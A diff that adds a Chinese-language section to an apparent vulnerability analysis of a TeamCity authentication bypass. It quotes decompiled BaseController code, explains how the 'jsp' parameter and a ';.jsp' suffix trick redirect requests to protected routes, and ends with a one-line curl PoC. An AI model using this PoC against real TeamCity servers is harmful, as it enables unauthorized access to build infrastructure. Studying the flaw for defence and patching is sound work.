@@ -602,3 +602,47 @@ private Stack getRequestStack(HttpServletRequest var1) {
 
 - Teamcity < 2023.11.4
 
+也是个未授权访问漏洞，该漏洞位于 `jetbrains.buildServer.controllers.BaseController` 中，在它的 handleRequestInternal 方法中若 modelAndView 对象的不是重定向，则会调用 `updateViewIfRequestHasJspParameter` 更新 `modelAndView` 对象
+
+```java
+public final ModelAndView handleRequestInternal(HttpServletRequest request, HttpServletResponse response) throws Exception {
+	try {
+		ModelAndView modelAndView = this.doHandle(request, response);
+		if (modelAndView != null) {
+			if (modelAndView.getView() instanceof RedirectView) {
+				modelAndView.getModel().clear();
+			} else {
+				this.updateViewIfRequestHasJspParameter(request, modelAndView);
+			}
+		}
+
+		return modelAndView;
+	} catch (AccessDeniedException var8) {
+```
+
+`updateViewIfRequestHasJspParameter` 的实现如下，可以看到能够通过 `jsp` 参数修改 `modelAndView` 的 `viewName`
+
+```java
+private void updateViewIfRequestHasJspParameter(@NotNull HttpServletRequest request, @NotNull ModelAndView modelAndView) {
+	boolean isControllerRequestWithViewName = modelAndView.getViewName() != null && !request.getServletPath().endsWith(".jsp");
+	String jspFromRequest = this.getJspFromRequest(request);
+	if (isControllerRequestWithViewName && StringUtil.isNotEmpty(jspFromRequest) && !modelAndView.getViewName().equals(jspFromRequest)) {
+		// 通过 jsp 参数修改 modelAndView 的 viewName
+		modelAndView.setViewName(jspFromRequest);
+	}
+
+}
+
+@Nullable
+protected String getJspFromRequest(@NotNull HttpServletRequest request) {
+	String jspFromRequest = request.getParameter("jsp");
+	return jspFromRequest == null || jspFromRequest.endsWith(".jsp") && !jspFromRequest.contains("admin/") ? jspFromRequest : null;
+}
+```
+
+这里对 `jsp` 参数的内容有一定限制，需要以 `.jsp` 结尾，且不能包含 `admin/`。想利用该漏洞，需要先让请求到达 `BaseController`，再构造 `jsp` 参数，让请求转发至目标路由。由于 `BaseController` 是其它 `Controller` 的父类，随意找一个无需授权的 `Controller` 它的，例如 `loginController`、`PageNotFoundController` 等。下一步就是构造 `jsp` 参数，由于它必须以 `.jsp` 结尾，可用 `;` 将路由和 `.jsp` 分开。最终 `Poc` 如下
+
+```bash
+curl -ik http://localhost:8112/login.html?jsp=/app/rest/server;.jsp
+```
+
